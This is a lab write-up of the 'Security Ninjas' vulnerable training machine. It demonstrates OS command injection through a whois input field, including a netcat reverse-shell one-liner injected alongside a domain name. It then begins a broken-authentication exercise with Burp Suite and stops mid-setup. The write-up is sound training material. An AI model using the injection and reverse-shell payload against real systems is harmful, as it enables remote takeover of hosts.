This is Vulnerable Mcachine ```Security Ninjas```.

We can test this for common web vulnerabilities

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/daaddc57-1780-4268-b995-afff747dbbaf)

Well, lets dig in


# A1
<hr>

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/17788d91-cbd8-4094-a1c4-63fe307635dc)

We were told that this page has an ```OS Command Injection``` flaw

Lets provide a domain name say ```google.com```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/84db4b64-e987-4ed0-9fcb-eee65f7835f9)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/89c48ad7-31a2-4491-9d29-a7c7f0085987)

So we got the whois look up results for the domain name ```google.com```

The ```semicolon(;)``` is often used as a delimiter so seperate multiple commands within a single input field. So, we can try to use the ```semicolon(;)``` character to run multiple commands.

For example lets say we want to run the ```id``` command alongside the domain name we provided. So, we'll be having an input like this ```google.com;id```

Lets try to execute this to see what happens

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/730ee60f-38a8-4c9a-85a4-5cf2f525d477)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/7a23174f-f258-4b4d-8bad-91b5efffcb21)

Scrolling down,

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6cef73f1-ffc0-4d30-858d-a7a1e4217465)

It worked hehe, we were able to successfully execute the linux command

Other delimiter characters like ```|``` and ```||``` also works

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/a25768ec-3be8-489a-9333-e3c310810ef2)

Lets get a reverse shell from this

payload:```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f```

Ensure you set up a netcat listener

So, our input would look like this ```google.com|rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.168 1234 >/tmp/f```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c6f015db-919f-44b6-82ef-1c31a1c74737)

Checking my netcat listener

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/26861a22-4676-4f97-af6f-8a515b1e3055)

I was able to get a reverse shell.

Well, that's all for this challenge since we've successfully exploited the vulnerability there. 

--------------------------

# A2
<hr>

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/11a9f185-7ec9-4718-9d2f-201b125f8df8)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0a6fc465-dff6-4ecf-8bde-eb388da15227)

So the exercise here is to get ```user2``` personal information by exploiting the ```Broken Authentication and Session Management``` vulnerability

Lets try to login with the details they provided to us

username:```user1```        password:```145_Bluxome```

![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/fa96800c-803b-4392-aa4e-c3089c40e40d)
![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c8aca000-2109-4af5-b21d-b80d262b5051)

Cool, we are logged in

Lets try to view personal details, but this time we'll capture the request to burpsuite and send it over to burp repeater














